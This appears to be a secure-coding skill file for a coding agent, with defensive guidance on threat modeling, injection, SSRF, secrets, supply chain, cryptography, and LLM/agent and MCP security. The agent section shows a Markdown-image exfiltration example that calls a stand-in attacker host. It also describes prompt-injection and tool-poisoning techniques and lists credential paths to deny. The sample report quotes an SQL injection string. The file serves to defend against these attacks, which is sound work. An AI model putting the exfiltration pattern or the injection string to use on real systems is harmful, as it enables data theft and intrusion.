---
name: secure-coding
description: Load before writing or reviewing code that handles untrusted input, secrets, authentication, cryptography, dependencies, local servers or LLM/agent tool use — threat modeling, safe patterns for injection, path, SSRF, XSS and deserialization flaws, secrets hygiene, supply-chain checks, prompt-injection and exfiltration defenses, MCP server trust, review checklist and severity report.
---
# Secure coding

## Scope and ground rules
- Covers: designing, writing and reviewing software that resists attack — web/API code, CLIs, data pipelines, local servers, LLM and agent applications, MCP servers.
- Related: `review-protocol` (severity rubric and review report format), `formal-methods` (fuzzing parsers of untrusted input), `rag-agents` (agent and RAG design), `claude-code-extensions` (permission rules and hooks in this stack).
- Ground rules: test only code and systems you own or are authorized to test; proof-of-concepts run locally against your own instance; never exfiltrate real data; when a scanner finds a secret, report its location and type, not its value.

## 1. Threat model in five steps
1. **Assets:** credentials and keys, personal data, user files, money-moving or message-sending capabilities, code execution and deploy rights, model weights, availability.
2. **Entry points:** HTTP endpoints, CLI args, environment, config files, uploads and archives, IPC/sockets, webhooks, queues, dependencies and the build pipeline, and for LLM systems every prompt, retrieved document, web page, tool result and image.
3. **Trust boundaries:** where data moves from less to more trusted — network → server, user → admin, model output → tool execution, plugin/MCP server → host, container → host. Sketch the data flow.
4. **STRIDE per boundary:** Spoofing (authn), Tampering (integrity, signatures), Repudiation (audit logs), Information disclosure (logs, errors, side channels), Denial of service (unbounded sizes, ReDoS, decompression bombs, token/cost exhaustion), Elevation of privilege (authz gaps, injection, deserialization).
5. **Rank** by impact × likelihood, choose mitigations, and write the top abuse cases as tests.

## 2. Input handling principles
- Parse, don't sanitize: convert input into typed values at the boundary (pydantic, serde with `deny_unknown_fields`, zod), allowlists over denylists, limits on size, depth, count and time.
- Canonicalize before checking (Unicode normalization, path resolution, URL parsing) and use exactly the representation you checked.
- Encode for the sink at output time (HTML, SQL, shell, URL, JSON, logs). Fail closed; errors reveal nothing internal.

## 3. Vulnerability classes and safe patterns
- **SQL injection (CWE-89):** parameters only — `cur.execute("SELECT * FROM t WHERE id = %s", (uid,))` (psycopg) or `?` (sqlite3). Identifiers via an allowlist or `psycopg.sql.Identifier`. ORM raw fragments (`text()`, raw SQL helpers) need the same care.
- **Command and argument injection (CWE-78, CWE-88):** no shell — `subprocess.run(["git", "log", "--", path], check=True)`; Node `execFile`/`spawn` without `shell: true`; Rust `Command` is shell-free. Put `--` before user operands so they cannot become options (e.g. `--upload-pack=...`). Never interpolate into `sh -c`.
- **Template injection (CWE-1336):** never compile user input as a template; pass it as data; Jinja2 with `autoescape=select_autoescape()`; untrusted templates only in `jinja2.sandbox.SandboxedEnvironment`.
- **Path traversal and link races (CWE-22, CWE-59, CWE-367):** resolve and confine (snippet below). Against a local attacker who can swap path components between check and use, open relative to a directory handle without following links: Linux `openat2` with `RESOLVE_BENEATH`/`RESOLVE_NO_SYMLINKS`, Go 1.24+ `os.Root`, Rust `cap-std`. Archives: validate every member name (zip slip) and cap total size and count; Python `tarfile` extraction with `filter="data"` (the default only from 3.14).
- **SSRF (CWE-918):** any server-side fetch of a user-influenced URL (webhooks, link previews, importers, OAuth metadata, agent fetch tools). Allowlist schemes and hosts where possible; otherwise resolve once, reject non-public addresses, connect to the vetted IP, and re-validate every redirect (or disable redirects). Validate the resolved address, not the string — decimal/octal/hex IPs, IPv4-mapped IPv6 and userinfo tricks defeat string checks. Server-side fetchers belong behind an egress proxy that enforces this (e.g. Smokescreen).
- **XSS (CWE-79), CSRF (CWE-352):** framework auto-escaping; no `innerHTML`/`dangerouslySetInnerHTML`/`v-html` with untrusted data; DOMPurify when HTML is required; Markdown renderers with raw HTML disabled or sanitized output. Strict CSP: `script-src 'nonce-<random>' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`, plus `require-trusted-types-for 'script'` where supported and `X-Content-Type-Options: nosniff`. State-changing requests: SameSite cookies + CSRF token + `Origin` check.
- **Deserialization (CWE-502):** never load untrusted `pickle`/`joblib`/`shelve`/`marshal`, `yaml.load` without a safe loader, `numpy.load(allow_pickle=True)`, `torch.load(weights_only=False)` (the default has been `True` since PyTorch 2.6 — keep it), Java `ObjectInputStream`, .NET `BinaryFormatter`, PHP `unserialize`, Ruby `Marshal`. Use JSON/protobuf/MessagePack with schema validation, `yaml.safe_load`, safetensors for weights. `trust_remote_code=True` executes repository code — pin a reviewed revision.
- **XXE and entity bombs (CWE-611, CWE-776):** Python `defusedxml`; lxml `XMLParser(resolve_entities=False, no_network=True)` set explicitly; Java `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
- **ReDoS (CWE-1333):** nested or overlapping quantifiers (`(a+)+`, `(a|aa)*`) on untrusted text. Use linear-time engines (RE2 via `google-re2`, Rust `regex`, Go `regexp`, .NET `RegexOptions.NonBacktracking`); Python `re` has no timeout — cap input length, use atomic groups/possessive quantifiers (3.11+).
- **Integer overflow and truncation (CWE-190, CWE-681):** allocation sizes (`n * size`), width/sign conversions, Rust release-mode wrapping, NumPy fixed-width types. Use `checked_mul`/`try_from`, `__builtin_mul_overflow` or C23 `ckd_mul`.
- **TOCTOU and temp files (CWE-367, CWE-377):** no `os.access()`/`exists()` before `open()` — open and handle the error; `O_CREAT|O_EXCL` for create-if-absent; `fstat` the opened descriptor; `tempfile.mkstemp()`/`NamedTemporaryFile()`/`TemporaryDirectory()` (never `tempfile.mktemp()` or fixed `/tmp` names); shell: `tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT`.
- **Also:** open redirects (allowlist targets), mass assignment (explicit field allowlists), business-logic races (transactions, unique constraints), log and header injection (strip CR/LF).

```python
import ipaddress, os, socket, tempfile
from pathlib import Path

def public_addrs(host: str, port: int) -> list[str]:          # SSRF: resolve once, vet every address
    out = []
    for *_, sockaddr in socket.getaddrinfo(host, port, type=socket.SOCK_STREAM):
        ip = ipaddress.ip_address(sockaddr[0])
        if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped:
            ip = ip.ipv4_mapped                                  # ::ffff:127.0.0.1 -> 127.0.0.1
        if not ip.is_global or ip.is_multicast:                  # loopback, private, link-local (metadata), CGNAT, ...
            raise PermissionError(f"non-public address {ip}")
        out.append(str(ip))
    return out                                                   # connect to these IPs, keep Host/SNI = host

def safe_join(base: Path, user_path: str) -> Path:             # traversal: resolve, then confine
    base = base.resolve()
    p = (base / user_path).resolve()                             # follows symlinks: sub/link -> /etc is caught
    if not p.is_relative_to(base):
        raise PermissionError(f"{user_path!r} escapes {base}")
    return p

def atomic_write(path: Path, data: bytes) -> None:             # private temp file + atomic replace
    fd, tmp = tempfile.mkstemp(dir=path.parent, prefix=f".{path.name}.")   # mode 0600, O_EXCL
    try:
        with os.fdopen(fd, "wb") as f:
            f.write(data); f.flush(); os.fsync(f.fileno())
        os.replace(tmp, path)
    except BaseException:
        os.unlink(tmp); raise
```

## 4. Secrets
- **Storage:** injected at runtime from a secret manager or OS keychain — macOS `security add-generic-password -a "$USER" -s myapp -w` (prompts when `-w` is last) and `security find-generic-password -a "$USER" -s myapp -w`; Linux `secret-tool store --label=myapp service myapp` / `secret-tool lookup service myapp`; Python `keyring`; 1Password `op run --env-file=.env.tpl -- cmd` with `op://vault/item/field` references; encrypted files in git with sops + age.
- **Never in:** source, git history, container layers, CI logs, argv (visible to other users in `ps` and in shell history), URLs (query strings land in logs and referrers), crash reports, frontend bundles, prompts or tool outputs. Environment variables leak to children and to `/proc/<pid>/environ` (same user): scope them; pass secrets through stdin or a 0600 file.
- **Logs:** structured logging with explicit fields; redact by key name and value pattern; never dump headers (`Authorization`, `Cookie`) or bodies wholesale.
- **Scanning:** `gitleaks git -v` (history), `gitleaks dir -v .` (working tree), and the pre-commit hook (`id: gitleaks`, which runs `gitleaks git --pre-commit --redact --staged --verbose`); `trufflehog git file://. --results=verified,unknown` or `trufflehog filesystem .` — its verification contacts the provider, so run it only on your own repositories. Enable push protection on the forge.
- **After a leak:** revoke and rotate first (pushed = compromised), check access logs for use, then purge history (`git filter-repo`) and caches; a history rewrite alone does not un-leak.
- **Randomness and comparison:** `secrets.token_urlsafe(32)`/`os.urandom`, Rust `getrandom`/`OsRng`, JS `crypto.getRandomValues`/`crypto.randomBytes` — never `random`/`Math.random`; compare tokens and MACs with `hmac.compare_digest`/`crypto.timingSafeEqual`.

## 5. Dependencies and supply chain
- **Lock and enforce:** `uv lock` + `uv sync --locked`; hashes with `uv pip compile --generate-hashes` + `--require-hashes`; `npm ci` / `pnpm install --frozen-lockfile`; `cargo build --locked`; containers pinned by digest.
- **Cooldown on fresh releases** (malicious versions are often detected and pulled within days): uv `exclude-newer = "7 days"`, pnpm `minimumReleaseAge` (minutes, 10.16+), npm `min-release-age` (days, 11.10+), Yarn `npmMinimalAgeGate`.
- **Install-time code:** `npm ci --ignore-scripts` where possible; pnpm 10+ runs dependency lifecycle scripts only when allowlisted (`allowBuilds`, 10.26+; pnpm 11 removed the older `onlyBuiltDependencies`); Python sdists execute build code — prefer wheels (`--only-binary :all:`, uv `--no-build`).
- **Audit and triage:** `uvx pip-audit` (or `uv audit`, preview in recent uv), `cargo audit`, `cargo deny check` (advisories, bans, licenses, sources), `npm audit --omit=dev`, `osv-scanner scan source -r .`. For each advisory: is the vulnerable code reachable, what is the fixed version, is there a workaround.
- **Provenance:** PyPI Trusted Publishing and attestations (PEP 740), `npm publish --provenance` and `npm audit signatures`, Sigstore/cosign for images, `gh attestation verify <artifact> --owner <org>`, `cargo vet`.
- **Name attacks:** before adding a dependency check its exact name, owner, age, downloads and repository — above all for names an LLM suggested (hallucinated names get registered: slopsquatting). Dependency confusion: resolve private names from one explicit index; uv's default `first-index` strategy does not fall through to PyPI, pip's `--extra-index-url` does.

## 6. Authentication and authorization
- Use proven identity providers and libraries; no home-grown auth protocols.
- **Sessions:** server-side, ≥ 128-bit random IDs, rotated at login and privilege change, idle and absolute timeouts, cookies `__Host-` prefixed with `Secure; HttpOnly; SameSite=Lax` (or `Strict`); logout invalidates server-side.
- **JWTs:** verify with an algorithm allowlist (`jwt.decode(token, key, algorithms=["RS256"], audience=AUD, issuer=ISS)` in PyJWT), reject `none` and HS/RS confusion, check `exp`/`nbf`/`aud`/`iss`, short lifetimes, refresh-token rotation with reuse detection; long-lived tokens do not belong in `localStorage`.
- **OAuth 2.0 / OIDC** (RFC 9700 is the security BCP): authorization code + PKCE (S256) for every client, exact redirect-URI matching, `state` and OIDC `nonce` validated, no implicit or password grants, minimal scopes, audience-restricted tokens — never forward a token issued for one service to another.
- **Authorization:** deny by default; enforce server-side on every request at object level (IDOR/BOLA: does this caller own object 123?), function level and field level; one central policy function; tests with two users and one admin.
- **Passwords** (OWASP): argon2id (e.g. m = 19 MiB, t = 2, p = 1 or m = 46 MiB, t = 1, p = 1), bcrypt cost ≥ 10 (72-byte input limit), scrypt N = 2^17, r = 8, p = 1, or PBKDF2-HMAC-SHA256 with 600,000 iterations where FIPS applies; rehash on login when parameters change; rate limiting; MFA (passkeys/WebAuthn over TOTP over SMS).
- **Least privilege:** scoped service accounts, separate read and write credentials, short-lived federated cloud credentials over static keys, containers as non-root with read-only filesystems and dropped capabilities.

## 7. Cryptography
- Vetted high-level APIs only: Python `cryptography` (AEAD `AESGCM`, `ChaCha20Poly1305`; `Fernet`), libsodium/PyNaCl (XChaCha20-Poly1305, sealed boxes), RustCrypto AEAD crates or `ring`, Go `crypto/*`, WebCrypto. Protocols: TLS, Noise, age — don't design your own.
- Authenticated encryption only (no ECB, no unauthenticated CBC/CTR). Nonces unique per key: AES-GCM with random 96-bit nonces is limited to 2^32 messages per key; XChaCha20 (192-bit nonces) makes random nonces safe; a repeated GCM nonce leaks the authentication key and plaintext XOR.
- Integrity: SHA-256/SHA-3/BLAKE2/BLAKE3; MACs: HMAC-SHA256; never MD5/SHA-1 for security. Signatures: Ed25519 (or ECDSA P-256 via a vetted library); verify before parsing signed data.
- Keys from a KMS or keychain, one key per purpose (HKDF for derivation), rotation planned; TLS verification always on (no `verify=False`, `InsecureSkipVerify`), TLS 1.2+ (prefer 1.3).
```python
from argon2 import PasswordHasher                               # argon2-cffi: argon2id, m=64 MiB, t=3, p=4 by default
ph = PasswordHasher(); stored = ph.hash(password)
ph.verify(stored, attempt)                                      # raises VerifyMismatchError; then ph.check_needs_rehash(stored)

import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
key = AESGCM.generate_key(bit_length=256)                       # from a KMS/keychain in real code
nonce = os.urandom(12)                                          # unique per message under this key
ct = AESGCM(key).encrypt(nonce, plaintext, b"context-v1")       # store nonce with ct; AAD binds context
```

## 8. LLM and agent applications
Model output is untrusted input, and text inside documents, web pages or tool results never authorizes an action. An agent that combines private data, untrusted content and an outbound channel (the "lethal trifecta") can be steered into exfiltration: remove at least one of the three per task.
- **Prompt injection** arrives directly or indirectly (web pages, email, PDFs, READMEs, code comments, issue text, file names, text in images, MCP tool descriptions and results). Delimiting and labeling untrusted text helps but is not a control. Controls: privilege separation (a quarantined model reads untrusted text and returns only schema-validated data to a privileged planner — dual-LLM/CaMeL-style designs), outputs constrained to enums/schemas, and human confirmation for consequential actions.
- **Exfiltration channels:** auto-rendered Markdown images and links (`![](https://attacker.example/?q=<secret>)`), fetch tools with data in query strings, DNS lookups, writes to shared locations, commits, PRs and emails. Mitigate with no auto-rendering of remote images from model output (or an allowlisting proxy and CSP `img-src`), domain allowlists on fetch tools, an egress proxy, and logs plus rate limits on outbound calls.
- **Tools:** least privilege per tool (read-only by default, scoped tokens), server-side validation of typed arguments, allowlists for commands, paths and domains, explicit confirmation for side effects (send, pay, delete, deploy, push, publish), dry runs, budgets for steps/tokens/money/time, idempotency keys, an audit log of every call with its arguments.
- **Code execution:** sandbox it (containers or microVMs such as gVisor/Firecracker, `bubblewrap` on Linux, sandbox profiles on macOS), no network by default, read-only mounts except a scratch workspace, CPU/memory/time limits, no host credentials in the environment.
- **File guards:** confine to the workspace with `safe_join` semantics, refuse symlinks that leave it, deny sensitive paths (`~/.ssh`, `~/.aws`, `~/.config/gcloud`, `.env`, keychains, browser profiles), cap sizes.
- **MCP servers:** a stdio server runs with your privileges and a remote one holds your tokens. Install from reviewed source, pin versions or digests, start with a minimal environment (no inherited secrets) and sandbox where possible. Treat tool descriptions and results as untrusted: tool poisoning (instructions hidden in descriptions), rug pulls (descriptions changed after approval — re-review on update), cross-server shadowing (one server's text steering another's tools) — so keep high-privilege tools and untrusted-content servers out of the same agent. Building a server (MCP spec): MUST NOT accept tokens not issued to it (no token passthrough); MUST validate `Origin` on Streamable HTTP; SHOULD bind to 127.0.0.1 locally and require auth; MUST NOT treat sessions or state handles as authentication; OAuth proxies need per-client consent and exact redirect-URI matching. Clients: open only `http(s)` authorization URLs without a shell, and SSRF-guard metadata fetches.
- In Claude Code, permission deny rules and PreToolUse hooks can enforce command, path and domain policies (`claude-code-extensions` has the shapes). Assume system prompts can be extracted; enforce document-level access control at retrieval time in RAG; set quotas against token/cost exhaustion.

## 9. Secure defaults for local servers
- Bind `127.0.0.1`/`::1`, not `0.0.0.0`. Docker: `-p 127.0.0.1:8080:8080` — a bare `-p 8080:8080` listens on every interface, and Docker's iptables rules bypass ufw-style host firewalls on Linux.
- Authenticate even on localhost (other local users, processes and web pages can reach it): a ≥ 128-bit random bearer token compared in constant time, or a Unix domain socket with 0600 permissions in a 0700 directory.
- DNS rebinding: reject requests whose `Host`/`Origin` is not in an allowlist (`localhost:<port>`, `127.0.0.1:<port>`).
- CORS: no `Access-Control-Allow-Origin: *` on sensitive routes; never reflect an arbitrary `Origin` together with `Access-Control-Allow-Credentials: true`; allowlist exact origins. WebSockets: check `Origin` on upgrade.
- No exposed debuggers or consoles (Werkzeug debugger, `node --inspect=0.0.0.0`); request logging on; shut down when idle.

## Review checklist
- [ ] Threat model written: assets, entry points, trust boundaries, top abuse cases.
- [ ] Every attacker-controlled input traced to its sinks: SQL, shell, filesystem, template, HTML, URL fetch, deserializer, regex, allocation size.
- [ ] Authentication on every entry point; authorization per object and per function; deny by default.
- [ ] No secrets in code, history, logs, argv, URLs or images; gitleaks/trufflehog clean.
- [ ] Lockfiles enforced; audits clean or triaged with reachability; new dependencies vetted by name and provenance.
- [ ] Crypto through vetted libraries: AEAD with correct nonces, argon2id/bcrypt, CSPRNG, TLS verification on.
- [ ] Local servers: loopback bind, auth, Host/Origin checks, CORS allowlist.
- [ ] LLM/agent: no side effect without confirmation, egress allowlist, no auto-rendered remote images, sandboxed execution, path guards, MCP servers vetted and pinned.
- [ ] Abuse-case tests present; parsers of untrusted input fuzzed.

## Report
Use the `review-protocol` format and severity rubric; every finding adds the CWE, an exploit scenario (preconditions → steps → impact), evidence (file:line, local PoC or scanner output), a code-level fix and the test that fails before and passes after.
```
VERDICT: pass | pass-with-fixes | fail
FINDINGS (most severe first):
- [CRITICAL] CWE-89 app/db.py:42 — user id concatenated into SQL — any user reads all rows with "' OR 1=1 --" — parameterize the query — test_user_lookup_rejects_injection
CHECKED: files and flows reviewed; scanners run (name + version)
NOT CHECKED: what remains unverified
TOP 3 HARDENING ACTIONS: ...
```
